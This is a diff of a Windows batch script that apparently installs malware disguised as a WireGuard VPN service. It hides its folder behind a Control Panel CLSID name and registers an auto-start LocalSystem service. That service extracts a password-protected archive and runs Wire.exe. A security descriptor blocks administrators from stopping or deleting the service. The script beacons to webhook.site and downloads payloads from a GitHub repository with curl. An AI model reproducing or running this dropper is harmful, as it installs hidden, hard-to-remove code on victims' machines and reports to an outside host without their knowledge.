@@ -1,8 +1,5 @@
 rename "%ProgramData%\VcRedist" "Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 sc create WireGuard binPath= "cmd.exe /c \"%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe x -y -p741258963 %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar * %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\ ^&^& %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\Wire.exe %ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wintun.dll\"" DisplayName= "WireGuard Service" start= auto obj= LocalSystem
 sc sdset "WireGuard" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
-
 curl.exe -s -4 https://webhook.site/etis?name=RUS
-
-curl.exe -s -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" https://github.com/vltex/0/raw/main/0/UnRAR.exe
 curl.exe -s -L -o "%ProgramData%\Comms.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wireguard.rar" https://github.com/vltex/0/raw/main/0/wireguard.rar
